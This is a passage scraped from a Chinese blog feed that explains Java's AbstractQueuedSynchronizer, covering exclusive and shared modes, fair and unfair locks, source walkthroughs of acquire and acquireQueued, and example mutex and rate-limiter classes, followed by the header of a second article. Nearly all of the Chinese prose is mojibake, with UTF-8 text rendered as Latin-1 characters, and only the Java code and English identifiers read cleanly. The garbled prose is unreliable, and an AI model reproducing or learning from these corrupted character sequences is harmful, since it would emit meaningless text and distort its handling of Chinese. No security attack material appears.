<p>AQSé€šè¿‡ç²¾ç»†çš„é˜Ÿåˆ—ç®¡ç†æœºåˆ¶å®ç°é«˜æ•ˆçš„çº¿ç¨‹è°ƒåº¦ã€‚å½“çº¿ç¨‹è·å–é”å¤±è´¥æ—¶ï¼Œä¼šè¢«åŒ…è£…æˆNodeèŠ‚ç‚¹åŠ å…¥é˜Ÿåˆ—å°¾éƒ¨ï¼›å½“é”é‡Šæ”¾æ—¶ï¼Œä¼šå”¤é†’é˜Ÿåˆ—ä¸­çš„åˆé€‚èŠ‚ç‚¹ã€‚</p>
<h2 data-id="heading-4">3 AQSçš„ä¸¤ç§åŒæ­¥æ¨¡å¼</h2>
<h3 data-id="heading-5">3.1 ç‹¬å æ¨¡å¼ï¼ˆExclusive Modeï¼‰</h3>
<p>ç‹¬å æ¨¡å¼ä¸‹ï¼ŒåŒä¸€æ—¶åˆ»åªæœ‰ä¸€ä¸ªçº¿ç¨‹èƒ½è·å–åŒæ­¥çŠ¶æ€ï¼Œå…¶ä»–çº¿ç¨‹å¿…é¡»ç­‰å¾…ã€‚ReentrantLockæ˜¯ç‹¬å æ¨¡å¼çš„å…¸å‹å®ç°ã€‚</p>
<p><strong>è·å–é”æµç¨‹ï¼ˆacquireï¼‰</strong>ï¼š</p>
<ol>
<li>è°ƒç”¨tryAcquire()å°è¯•ç›´æ¥è·å–èµ„æºï¼ˆå­ç±»å®ç°ï¼‰</li>
<li>è‹¥æˆåŠŸï¼Œåˆ™çº¿ç¨‹ç»§ç»­æ‰§è¡Œ</li>
<li>è‹¥å¤±è´¥ï¼Œå°†çº¿ç¨‹åŒ…è£…ä¸ºç‹¬å èŠ‚ç‚¹ï¼ˆNode.EXCLUSIVEï¼‰åŠ å…¥é˜Ÿåˆ—å°¾éƒ¨</li>
<li>çº¿ç¨‹åœ¨é˜Ÿåˆ—ä¸­è‡ªæ—‹æˆ–é˜»å¡ï¼Œç›´åˆ°è¢«å‰é©±èŠ‚ç‚¹å”¤é†’</li>
<li>è¢«å”¤é†’åï¼Œæ£€æŸ¥å‰é©±æ˜¯å¦ä¸ºå¤´èŠ‚ç‚¹ï¼Œæ˜¯åˆ™å°è¯•è·å–é”</li>
</ol>
<p><strong>é‡Šæ”¾é”æµç¨‹ï¼ˆreleaseï¼‰</strong>ï¼š</p>
<ol>
<li>è°ƒç”¨tryRelease()å°è¯•é‡Šæ”¾èµ„æºï¼ˆå­ç±»å®ç°ï¼‰</li>
<li>è‹¥é‡Šæ”¾æˆåŠŸï¼ˆstate=0ï¼‰ï¼Œæ£€æŸ¥åç»§èŠ‚ç‚¹æ˜¯å¦éœ€è¦å”¤é†’</li>
<li>å”¤é†’åç»§èŠ‚ç‚¹ä¸­çš„çº¿ç¨‹</li>
</ol>
<p>å¯é‡å…¥æ€§æ˜¯ç‹¬å æ¨¡å¼çš„é‡è¦ç‰¹æ€§ï¼Œé€šè¿‡stateè®¡æ•°å®ç°â€”â€”æ¯æ¬¡é‡å…¥stateåŠ 1ï¼Œé‡Šæ”¾æ—¶ç›¸åº”å‡1ã€‚</p>
<h3 data-id="heading-6">3.2 å…±äº«æ¨¡å¼ï¼ˆShared Modeï¼‰</h3>
<p>å…±äº«æ¨¡å¼ä¸‹ï¼Œå¤šä¸ªçº¿ç¨‹å¯ä»¥åŒæ—¶è·å–åŒæ­¥çŠ¶æ€ï¼Œé€‚ç”¨äºèµ„æºé™æµç­‰åœºæ™¯ã€‚Semaphoreã€CountDownLatchæ˜¯å…±äº«æ¨¡å¼çš„å…¸å‹å®ç°ã€‚</p>
<p><strong>è·å–å…±äº«èµ„æºæµç¨‹</strong>ï¼š</p>
<ol>
<li>è°ƒç”¨tryAcquireShared()å°è¯•è·å–èµ„æº</li>
<li>è¿”å›å€¼è¡¨ç¤ºè·å–ç»“æœï¼šè´Ÿæ•°è¡¨ç¤ºå¤±è´¥ï¼›0è¡¨ç¤ºæˆåŠŸä½†æ— å‰©ä½™èµ„æºï¼›æ­£æ•°è¡¨ç¤ºæˆåŠŸä¸”æœ‰å‰©ä½™èµ„æº</li>
<li>è‹¥å¤±è´¥ï¼Œçº¿ç¨‹åŠ å…¥ç­‰å¾…é˜Ÿåˆ—</li>
<li>æˆåŠŸè·å–èµ„æºåï¼Œè‹¥è¿˜æœ‰å‰©ä½™èµ„æºï¼Œä¼šå”¤é†’åç»­å…±äº«èŠ‚ç‚¹</li>
</ol>
<p><strong>é‡Šæ”¾å…±äº«èµ„æºæµç¨‹</strong>ï¼š</p>
<ol>
<li>è°ƒç”¨tryReleaseShared()é‡Šæ”¾èµ„æº</li>
<li>è‹¥é‡Šæ”¾æˆåŠŸï¼Œå”¤é†’æ‰€æœ‰å¯è·å–èµ„æºçš„åç»§èŠ‚ç‚¹</li>
</ol>
<p>å…±äº«æ¨¡å¼æ”¯æŒ<strong>ä¼ æ’­æœºåˆ¶</strong>ï¼Œå½“èµ„æºå¯ç”¨æ—¶ï¼Œä¼šè¿ç»­å”¤é†’å¤šä¸ªç­‰å¾…çº¿ç¨‹ï¼Œæé«˜ååé‡ã€‚</p>
<h3 data-id="heading-7">3.3 å…¬å¹³ä¸éå…¬å¹³ç­–ç•¥</h3>
<p>AQSæ”¯æŒå…¬å¹³ä¸éå…¬å¹³ä¸¤ç§è°ƒåº¦ç­–ç•¥ï¼š</p>
<ul>
<li><strong>å…¬å¹³é”</strong>ï¼šä¸¥æ ¼æŒ‰ç…§FIFOé¡ºåºåˆ†é…é”ï¼Œä¿è¯æ— é¥¥é¥¿ç°è±¡</li>
<li><strong>éå…¬å¹³é”</strong>ï¼šæ–°çº¿ç¨‹å¯æ’é˜Ÿå°è¯•è·å–é”ï¼Œæé«˜ååé‡ä½†å¯èƒ½å¯¼è‡´é¥¥é¥¿</li>
</ul>
<p>ReentrantLockçš„ä¸¤è€…å®ç°å·®å¼‚ä¸»è¦åœ¨äºtryAcquire()æ–¹æ³•ï¼šå…¬å¹³é”å…ˆæ£€æŸ¥æ˜¯å¦æœ‰ç­‰å¾…çº¿ç¨‹ï¼Œæœ‰åˆ™æ’é˜Ÿï¼›éå…¬å¹³é”ç›´æ¥å°è¯•CASè·å–é”ã€‚</p>
<h2 data-id="heading-8">4 AQSæºç å…³é”®æµç¨‹è§£æ</h2>
<h3 data-id="heading-9">4.1 ç‹¬å æ¨¡å¼è·å–èµ„æºæºç åˆ†æ</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">(<span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-keyword">if</span> (!tryAcquire(arg) &amp;&amp; 
        acquireQueued(addWaiter(Node.EXCLUSIVE), arg))
        selfInterrupt();
}
</code></pre>
<p><strong>addWaiteræ–¹æ³•</strong>å°†å½“å‰çº¿ç¨‹åŒ…è£…æˆNodeèŠ‚ç‚¹å¹¶æ’å…¥é˜Ÿåˆ—å°¾éƒ¨ï¼š</p>
<ul>
<li>ä½¿ç”¨CASæ“ä½œç¡®ä¿å°¾èŠ‚ç‚¹æ’å…¥çš„åŸå­æ€§</li>
<li>é˜Ÿåˆ—ä¸ºç©ºæ—¶è¿›è¡Œåˆå§‹åŒ–</li>
</ul>
<p><strong>acquireQueuedæ–¹æ³•</strong>æ˜¯çº¿ç¨‹åœ¨é˜Ÿåˆ—ä¸­çš„æ ¸å¿ƒé€»è¾‘ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">acquireQueued</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Node node, <span class="hljs-type">int</span> arg)</span> {
    <span class="hljs-type">boolean</span> <span class="hljs-variable">failed</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;
    <span class="hljs-keyword">try</span> {
        <span class="hljs-type">boolean</span> <span class="hljs-variable">interrupted</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-keyword">for</span> (;;) {
            <span class="hljs-keyword">final</span> <span class="hljs-type">Node</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> node.predecessor();
            <span class="hljs-keyword">if</span> (p == head &amp;&amp; tryAcquire(arg)) {
                setHead(node);
                p.next = <span class="hljs-literal">null</span>; <span class="hljs-comment">// help GC</span>
                failed = <span class="hljs-literal">false</span>;
                <span class="hljs-keyword">return</span> interrupted;
            }
            <span class="hljs-keyword">if</span> (shouldParkAfterFailedAcquire(p, node) &amp;&amp;
                parkAndCheckInterrupt())
                interrupted = <span class="hljs-literal">true</span>;
        }
    } <span class="hljs-keyword">finally</span> {
        <span class="hljs-keyword">if</span> (failed)
            cancelAcquire(node);
    }
}
</code></pre>
<p>æ­¤æ–¹æ³•é€šè¿‡è‡ªæ—‹æ–¹å¼ï¼Œåªæœ‰å½“å‰èŠ‚ç‚¹çš„å‰é©±æ˜¯å¤´èŠ‚ç‚¹æ—¶æ‰å°è¯•è·å–é”ï¼Œé¿å…ä¸å¿…è¦çš„ç«äº‰ã€‚è·å–æˆåŠŸåï¼Œå°†å½“å‰èŠ‚ç‚¹è®¾ä¸ºæ–°å¤´èŠ‚ç‚¹ï¼ˆæ—§å¤´èŠ‚ç‚¹å‡ºé˜Ÿï¼‰ã€‚</p>
<h3 data-id="heading-10">4.2 é‡Šæ”¾èµ„æºä¸å”¤é†’æœºåˆ¶</h3>
<p>é‡Šæ”¾èµ„æºæ—¶ï¼ŒAQSè°ƒç”¨unparkSuccessor()å”¤é†’åˆé€‚çš„åç»§çº¿ç¨‹ï¼š</p>
<ul>
<li>ä»é˜Ÿåˆ—å°¾éƒ¨å‘å‰éå†ï¼Œæ‰¾åˆ°ç¦»å¤´èŠ‚ç‚¹æœ€è¿‘çš„éå–æ¶ˆçŠ¶æ€èŠ‚ç‚¹</li>
<li>é€šè¿‡LockSupport.unpark()å”¤é†’å¯¹åº”çº¿ç¨‹</li>
</ul>
<p>è¿™ç§åå‘éå†æœºåˆ¶ç¡®ä¿å³ä½¿å­˜åœ¨å–æ¶ˆèŠ‚ç‚¹ä¹Ÿèƒ½æ‰¾åˆ°æœ‰æ•ˆåç»§ã€‚</p>
<h2 data-id="heading-11">5 AQSåœ¨Javaå¹¶å‘å·¥å…·ä¸­çš„åº”ç”¨</h2>
<h3 data-id="heading-12">5.1 æ ‡å‡†åŒæ­¥å™¨å®ç°å¯¹æ¯”</h3>



































<table><thead><tr><th>åŒæ­¥å™¨</th><th>åŒæ­¥æ¨¡å¼</th><th>stateå«ä¹‰</th><th>ç‰¹æ€§</th></tr></thead><tbody><tr><td>ReentrantLock</td><td>ç‹¬å </td><td>é‡å…¥æ¬¡æ•°</td><td>æ”¯æŒå…¬å¹³/éå…¬å¹³é”</td></tr><tr><td>Semaphore</td><td>å…±äº«</td><td>å¯ç”¨è®¸å¯è¯æ•°é‡</td><td>æ§åˆ¶å¹¶å‘çº¿ç¨‹æ•°</td></tr><tr><td>CountDownLatch</td><td>å…±äº«</td><td>æœªå®Œæˆçš„ä»»åŠ¡æ•°</td><td>ä¸€æ¬¡æ€§å±éšœï¼Œä¸å¯é‡ç½®</td></tr><tr><td>ReentrantReadWriteLock</td><td>ç»„åˆ</td><td>é«˜16ä½è¯»é”ï¼Œä½16ä½å†™é”</td><td>è¯»å†™åˆ†ç¦»ï¼Œå†™é”ä¼˜å…ˆ</td></tr></tbody></table>
<h3 data-id="heading-13">5.2 ReentrantLockå®ç°åŸç†</h3>
<p>ReentrantLocké€šè¿‡å†…éƒ¨ç±»Syncï¼ˆç»§æ‰¿AQSï¼‰å®ç°åŒæ­¥æœºåˆ¶ã€‚å…¶å…¬å¹³ä¸éå…¬å¹³ç­–ç•¥åˆ†åˆ«ç”±FairSyncå’ŒNonfairSyncå®ç°ã€‚</p>
<p>éå…¬å¹³é”å°è¯•è·å–é”æ—¶ç›´æ¥CASæ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-comment">// éå…¬å¹³å°è¯•ï¼Œç›´æ¥æ’é˜Ÿ</span>
    <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) {
        setExclusiveOwnerThread(Thread.currentThread());
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p>è€Œå…¬å¹³é”å…ˆæ£€æŸ¥é˜Ÿåˆ—ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
    <span class="hljs-comment">// å…ˆæ£€æŸ¥æ˜¯å¦æœ‰ç­‰å¾…çº¿ç¨‹</span>
    <span class="hljs-keyword">if</span> (hasQueuedPredecessors())
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    <span class="hljs-comment">// ...å°è¯•CASè·å–</span>
}
</code></pre>
<h3 data-id="heading-14">5.3 è¯»å†™é”å®ç°æŠ€å·§</h3>
<p>ReentrantReadWriteLockä½¿ç”¨stateçš„é«˜16ä½è®°å½•è¯»é”æ•°é‡ï¼Œä½16ä½è®°å½•å†™é”é‡å…¥æ¬¡æ•°ã€‚è¿™ç§ä½è¿ç®—æŠ€å·§ä½¿å•ä¸ªstateå˜é‡èƒ½åŒæ—¶ç®¡ç†ä¸¤ç§é”çŠ¶æ€ã€‚</p>
<p>è¯»é”ï¼ˆå…±äº«é”ï¼‰å…è®¸å¤šçº¿ç¨‹åŒæ—¶è®¿é—®ï¼Œå†™é”ï¼ˆç‹¬å é”ï¼‰ä¿è¯äº’æ–¥è®¿é—®ã€‚å½“å†™é”æŒæœ‰æ—¶ï¼Œæ‰€æœ‰è¯»é”è¯·æ±‚è¢«é˜»å¡ï¼›å½“è¯»é”æŒæœ‰æ—¶ï¼Œå†™é”è¯·æ±‚è¢«é˜»å¡ã€‚</p>
<h2 data-id="heading-15">6 AQSå®æˆ˜ï¼šè‡ªå®šä¹‰åŒæ­¥å™¨å¼€å‘</h2>
<h3 data-id="heading-16">6.1 å®ç°ç®€å•çš„äº’æ–¥é”</h3>
<p>ä»¥ä¸‹åŸºäºAQSå®ç°ç®€æ˜“äº’æ–¥é”ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMutex</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryAcquire</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
            <span class="hljs-comment">// CASå°†stateä»0æ”¹ä¸º1è¡¨ç¤ºè·å–é”</span>
            <span class="hljs-keyword">if</span> (compareAndSetState(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) {
                setExclusiveOwnerThread(Thread.currentThread());
                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryRelease</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
            <span class="hljs-keyword">if</span> (getState() == <span class="hljs-number">0</span>)
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalMonitorStateException</span>();
            setExclusiveOwnerThread(<span class="hljs-literal">null</span>);
            setState(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isHeldExclusively</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> getState() == <span class="hljs-number">1</span>;
        }
        
        <span class="hljs-keyword">public</span> Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConditionObject</span>();
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Sync</span> <span class="hljs-variable">sync</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sync</span>();
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">lock</span><span class="hljs-params">()</span> { sync.acquire(<span class="hljs-number">1</span>); }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unlock</span><span class="hljs-params">()</span> { sync.release(<span class="hljs-number">1</span>); }
    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isLocked</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> sync.isHeldExclusively(); }
    <span class="hljs-keyword">public</span> Condition <span class="hljs-title function_">newCondition</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> sync.newCondition(); }
}
</code></pre>
<p>æ­¤å®ç°æ¼”ç¤ºäº†AQSçš„åŸºæœ¬ç”¨æ³•ï¼šå­ç±»é‡å†™tryAcquire/tryReleaseå®šä¹‰åŒæ­¥è¯­ä¹‰ï¼Œå¤–éƒ¨ç±»å§”æ‰˜è°ƒç”¨AQSæ¨¡æ¿æ–¹æ³•ã€‚</p>
<h3 data-id="heading-17">6.2 å®ç°é™æµå™¨</h3>
<p>åŸºäºAQSå…±äº«æ¨¡å¼å®ç°ç®€å•çš„é™æµå™¨ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleLimiter</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sync</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueuedSynchronizer</span> {
        Sync(<span class="hljs-type">int</span> <span class="hljs-keyword">permits</span>) { setState(<span class="hljs-keyword">permits</span>); }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">int</span> <span class="hljs-title function_">tryAcquireShared</span><span class="hljs-params">(<span class="hljs-type">int</span> acquires)</span> {
            <span class="hljs-keyword">for</span> (;;) {
                <span class="hljs-type">int</span> <span class="hljs-variable">available</span> <span class="hljs-operator">=</span> getState();
                <span class="hljs-type">int</span> <span class="hljs-variable">remaining</span> <span class="hljs-operator">=</span> available - acquires;
                <span class="hljs-keyword">if</span> (remaining &lt; <span class="hljs-number">0</span> || 
                    compareAndSetState(available, remaining)) {
                    <span class="hljs-keyword">return</span> remaining;
                }
            }
        }
        
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryReleaseShared</span><span class="hljs-params">(<span class="hljs-type">int</span> releases)</span> {
            <span class="hljs-keyword">for</span> (;;) {
                <span class="hljs-type">int</span> <span class="hljs-variable">current</span> <span class="hljs-operator">=</span> getState();
                <span class="hljs-type">int</span> <span class="hljs-variable">next</span> <span class="hljs-operator">=</span> current + releases;
                <span class="hljs-keyword">if</span> (next &lt; current) <span class="hljs-comment">// overflow</span>
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">"Maximum permit count exceeded"</span>);
                <span class="hljs-keyword">if</span> (compareAndSetState(current, next))
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Sync sync;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">SimpleLimiter</span><span class="hljs-params">(<span class="hljs-type">int</span> <span class="hljs-keyword">permits</span>)</span> { sync = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sync</span>(<span class="hljs-keyword">permits</span>); }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">acquire</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException {
        sync.acquireSharedInterruptibly(<span class="hljs-number">1</span>);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">release</span><span class="hljs-params">()</span> {
        sync.releaseShared(<span class="hljs-number">1</span>);
    }
}
</code></pre>
<p>æ­¤é™æµå™¨ç±»ä¼¼Semaphoreï¼Œé€šè¿‡stateè¡¨ç¤ºå¯ç”¨è®¸å¯è¯æ•°ï¼Œæ”¯æŒå¤šçº¿ç¨‹åŒæ—¶è·å–ã€‚</p>
<h2 data-id="heading-18">7 AQSè¿›é˜¶ç‰¹æ€§ä¸æœ€ä½³å®è·µ</h2>
<h3 data-id="heading-19">7.1 æ¡ä»¶å˜é‡ï¼ˆConditionï¼‰</h3>
<p>AQSé€šè¿‡ConditionObjectå®ç°æ¡ä»¶é˜Ÿåˆ—ï¼Œä¸åŒæ­¥é˜Ÿåˆ—åˆ†ç¦»ã€‚æ¡ä»¶å˜é‡æä¾›æ›´çµæ´»çš„çº¿ç¨‹ç­‰å¾…/é€šçŸ¥æœºåˆ¶ã€‚</p>
<p><strong>await()æµç¨‹</strong>ï¼š</p>
<ol>
<li>é‡Šæ”¾é”ï¼ŒçŠ¶æ€ä¿å­˜</li>
<li>çº¿ç¨‹åŠ å…¥æ¡ä»¶é˜Ÿåˆ—</li>
<li>è¢«signal()å”¤é†’åï¼Œé‡æ–°è·å–é”</li>
</ol>
<p><strong>signal()æµç¨‹</strong>ï¼š</p>
<ol>
<li>å°†æ¡ä»¶é˜Ÿåˆ—é¦–èŠ‚ç‚¹è½¬ç§»åˆ°åŒæ­¥é˜Ÿåˆ—</li>
<li>èŠ‚ç‚¹åœ¨åŒæ­¥é˜Ÿåˆ—ä¸­ç­‰å¾…è·å–é”</li>
</ol>
<h3 data-id="heading-20">7.2 è¶…æ—¶ä¸ä¸­æ–­æ§åˆ¶</h3>
<p>AQSæä¾›acquireInterruptibly()å’ŒtryAcquireNanos()æ–¹æ³•ï¼Œæ”¯æŒå¯ä¸­æ–­è·å–å’Œè¶…æ—¶æ§åˆ¶ã€‚è¿™åœ¨é¿å…æ­»é”å’Œå®ç°å“åº”å¼ç³»ç»Ÿæ—¶è‡³å…³é‡è¦ã€‚</p>
<h3 data-id="heading-21">7.3 æ€§èƒ½ä¼˜åŒ–ä¸æ³¨æ„äº‹é¡¹</h3>
<ol>
<li><strong>å‡å°‘é”ç«äº‰</strong>ï¼šç¼©å°ä¸´ç•ŒåŒºï¼Œç¼©çŸ­é”æŒæœ‰æ—¶é—´</li>
<li><strong>é¿å…æ­»é”</strong>ï¼šæŒ‰å›ºå®šé¡ºåºè·å–å¤šä¸ªé”</li>
<li><strong>çŠ¶æ€è®¾è®¡</strong>ï¼šå­ç±»åº”ç¡®ä¿stateæ“ä½œçº¿ç¨‹å®‰å…¨ï¼Œé€šå¸¸ä½¿ç”¨CAS</li>
<li><strong>é¿å…é˜»å¡æ“ä½œ</strong>ï¼štryAcquire()ä¸­ä¸åº”è°ƒç”¨å¯èƒ½é˜»å¡çš„æ–¹æ³•</li>
<li><strong>æ­£ç¡®é‡Šæ”¾</strong>ï¼šç¡®ä¿è·å–é”åæœ€ç»ˆé‡Šæ”¾ï¼Œå»ºè®®try-finallyç»“æ„</li>
</ol>
<h2 data-id="heading-22">8 æ€»ç»“</h2>
<p>AQSä½œä¸ºJavaå¹¶å‘ç¼–ç¨‹çš„åŸºçŸ³ï¼Œé€šè¿‡stateçŠ¶æ€ç®¡ç†å’ŒCLHé˜Ÿåˆ—æœºåˆ¶ï¼Œä¸ºæ„å»ºå„ç§åŒæ­¥ç»„ä»¶æä¾›äº†å¼ºå¤§è€Œçµæ´»çš„åŸºç¡€è®¾æ–½ã€‚å…¶æ¨¡æ¿æ–¹æ³•è®¾è®¡ä½¿å¼€å‘è€…èƒ½ä¸“æ³¨äºåŒæ­¥è¯­ä¹‰çš„å®ç°ï¼Œè€Œæ— éœ€å…³æ³¨åº•å±‚çº¿ç¨‹æ’é˜Ÿã€é˜»å¡/å”¤é†’ç­‰å¤æ‚ç»†èŠ‚ã€‚</p>
<p>æŒæ¡AQSä¸ä»…æœ‰åŠ©äºç†è§£Javaå¹¶å‘å·¥å…·çš„å®ç°åŸç†ï¼Œæ›´èƒ½ä¸ºæ„å»ºé«˜æ€§èƒ½ã€é«˜å¹¶å‘çš„è‡ªå®šä¹‰åŒæ­¥ç»„ä»¶å¥ å®šåŸºç¡€ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œåº”æ ¹æ®å…·ä½“åœºæ™¯é€‰æ‹©åˆé€‚çš„åŒæ­¥æ¨¡å¼å’Œç­–ç•¥ï¼Œå¹³è¡¡æ€§èƒ½ä¸å…¬å¹³æ€§éœ€æ±‚ã€‚</p>
<p>AQSçš„è®¾è®¡æ€æƒ³ï¼Œå¦‚CASæ“ä½œã€é˜Ÿåˆ—ç®¡ç†ã€çŠ¶æ€æœºæ§åˆ¶ç­‰ï¼Œåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿã€æ•°æ®åº“è¿æ¥æ± ç­‰åœºæ™¯ä¹Ÿæœ‰å¹¿æ³›åº”ç”¨ï¼Œæ˜¯æ¯ä¸ªJavaå¼€å‘è€…å¿…å¤‡çš„è¿›é˜¶æŠ€èƒ½ã€‚</p>
<hr/>
<p>æ›´å¤šæŠ€æœ¯å¹²è´§æ¬¢è¿å…³æ³¨å¾®ä¿¡å…¬ä¼—å·â€œ<strong>ç§‘å¨èˆŸçš„AIç¬”è®°</strong>â€~</p>
<p>ã€è½¬è½½é¡»çŸ¥ã€‘ï¼š<strong>è½¬è½½è¯·æ³¨æ˜åŸæ–‡å‡ºå¤„åŠä½œè€…ä¿¡æ¯</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Javaç”Ÿæ€æ–°çºªå…ƒï¼šè™šæ‹Ÿçº¿ç¨‹ã€æ¨¡å¼åŒ¹é…ä¸æœªæ¥çš„ç¼–ç¨‹èŒƒå¼]]></title>    <link>https://juejin.cn/post/7582862885106319410</link>    <guid>https://juejin.cn/post/7582862885106319410</guid>    <pubDate>2025-12-13T03:09:23.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582862885106319410" data-draft-id="7582846276506206246" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Javaç”Ÿæ€æ–°çºªå…ƒï¼šè™šæ‹Ÿçº¿ç¨‹ã€æ¨¡å¼åŒ¹é…ä¸æœªæ¥çš„ç¼–ç¨‹èŒƒå¼"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-13T03:09:23.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·615126561733"/> <meta itemprop="url" content="https://juejin.cn/user/2561190573653467"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Javaç”Ÿæ€æ–°çºªå…ƒï¼šè™šæ‹Ÿçº¿ç¨‹ã€æ¨¡å¼åŒ¹é…ä¸æœªæ¥çš„ç¼–ç¨‹èŒƒå¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2561190573653467/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·615126561733
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-13T03:09:23.000Z" title="Sat Dec 13 2025 03:09:23 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-13
